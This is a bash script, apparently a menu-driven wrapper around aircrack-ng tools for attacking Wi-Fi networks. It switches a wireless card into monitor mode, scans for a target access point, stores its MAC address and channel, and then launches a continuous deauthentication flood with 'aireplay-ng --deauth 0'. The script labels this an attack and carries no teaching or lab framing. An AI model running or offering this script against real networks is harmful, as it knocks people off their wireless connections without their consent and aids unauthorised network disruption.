#!/bin/bash
#!/bin/sh

termw=$(echo $(tput cols))
interface=""
function showUi () {
    if [[ $termw -ge 75 ]]; then
        cat assets/dscrpt-art.ascii
    else
        cat assets/dscrpt-min-art.ascii
    fi
}
# function inputChecker() {
#     input_title=$(($1))
#     input_option_name=$(($2))
#     case_length$(($3))
    

#     while [ true ]
#     do
#         echo
#             echo -n $input_title
#         echo
#         read $input_option_name
#     done
# }
if [[ $(whoami) == 'root' ]]; then
    while [ true ]
    do
        showUi
        echo
            echo -n "   Write your option: "
        read option
        case $option in 
            1)
                echo
                while [[ true ]]
                do
                    ifconfig
                    echo
                        echo "Choose your network interface" | boxes -d stone
                    echo "|"
                    echo -n "|--#:"
                    read interface
                    printf "Your network interface is $interface? Right? \n y/n: " 
                    read interface_checker
                    if [[ $interface_checker == 'y' ]]; then
                        airmon-ng start $interface
                        airmon-ng check kill
                        sleep 2
                        ifconfig | grep "$interface" 
                        echo "$interface""mon" > data/interface.dat
                        sleep 2
                        printf "!Your network interface ready for attack! \n"
                        sleep 2
                        break
                    fi
                done;;
            2)
                printf "! Make sure your network card is in monitor mode !\n  Your selected network interface is $(cat data/interface.dat)" | boxes -d stone
                sleep 4
                printf "\n airodump-ng starting..."
                sleep 1
                airodump-ng $(cat data/interface.dat)
                echo "If you have chosen a target, you can write this data"
                printf "\n Target Mac Addres: "
                read target_mac && echo $target_mac > data/target_mac.dat
                printf "\n Target Channel: "
                read target_ch && echo $target_ch > data/target_ch.dat
            ;;
            3)
                printf "
            Interface: $(cat data/interface.dat)
            Netrwok Target
                |- Mac Addres: $(cat data/target_mac.dat)
                |- Channel: $(cat data/target_ch.dat)
            
"
            printf "\n Everything is okay?: (y/n) "
            read checker
            if [[ $checker == "y" ]]; then
            	airodump-ng --bssid $(cat data/target_mac.dat) --channel $(cat data/target_ch.dat) $(cat data/interface.dat) | aireplay-ng --deauth 0 -a $(cat data/target_mac.dat) $(cat data/interface.dat)
            fi
            sleep 4
            ;;
            'exit')
            break;;
            *)
            echo 'Invalid option, try again';;
        esac
    done
else
    echo
    echo
    echo "  !!! WARNING YOU NEED RUN THIS SCRIPT AS ROOT !!!"
    echo
    echo
fi